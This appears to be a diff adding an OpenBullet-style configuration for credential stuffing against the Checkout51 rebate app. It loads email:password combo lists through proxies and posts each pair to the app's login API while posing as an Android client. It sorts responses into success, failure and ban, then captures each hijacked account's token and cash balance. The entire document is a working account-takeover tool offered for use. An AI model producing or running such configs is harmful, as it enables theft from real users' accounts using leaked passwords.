@@ -1,0 +1,67 @@
+[SETTINGS]
+{
+  "Name": "Checkout51",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-06T08:59:15.7699156+01:00",
+  "AdditionalInfo": "",
+  "Author": "TheBusinessMan#2696",
+  "Version": "1.1.2",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [
+    {
+      "SliceName": "<PASS>",
+      "RuleType": 2,
+      "RuleString": "8",
+      "Id": 528203757
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION RandomString "?d?l?d?l?l?l?d?l-?d?d?l?l-?d?d?l?l-?l?d?d?l-?d?d?d?d?d?d?l?d?l?l?d?l" -> VAR "uuid" 
+
+REQUEST POST "https://public-api.checkout51.com/v1/login?platform=android&version=7.0.3.860&uuid=<uuid>&token_version=2&timezone=Asia%2FCalcutta&lang=EN_U" 
+  CONTENT "email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "user-agent: okhttp/3.12." 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban AND 
+    KEY "<RESPONSECODE>" EqualTo "403" 
+    KEY "Request blocked." 
+  KEYCHAIN Success OR 
+    KEY "\"status\":\"login_success\"" 
+  KEYCHAIN Failure OR 
+    KEY "Credentials were invalid" 
+    KEY "{\"status\":\"login_failed\",\"notes\":\"Unknown reason\",\"lang\":null}" 
+  KEYCHAIN Ban AND 
+    KEY "<RESPONSECODE>" EqualTo "403" 
+    KEY "<HEADERS(Content-Length)>" Contains "0" 
+
+PARSE "<SOURCE>" LR "\"user_id\":\"" "\"," -> VAR "uid" 
+
+PARSE "<SOURCE>" LR "\"token\":\"" "\"," -> VAR "atoken" 
+
+REQUEST GET "https://public-api.checkout51.com/v1/user?device_info=%7B%22os%22%3A%223.18.91%2B%22%2C%22sdk%22%3A%2227%22%2C%22manufacturer%22%3A%22Appetize.io%22%2C%22device%22%3A%22generic_x86%22%2C%22model%22%3A%22Android%20SDK%20built%20for%20x86%22%2C%22product%22%3A%22sdk_gphone_x86%22%7D&lang=EN_US&platform=android&version=7.0.3.860&uuid=<uuid>&token_version=2&timezone=Asia%2FCalcutta&authtoken=<atoken>&user_id=<uid>&lang=EN_US" EncodeContent=TRUE 
+  
+  HEADER "user-agent: okhttp/3.12.0" 
+  HEADER "accept-encoding: gzip" 
+
+PARSE "<SOURCE>" LR "\"balance\":\"" "\"," -> CAP "Balance" 
+
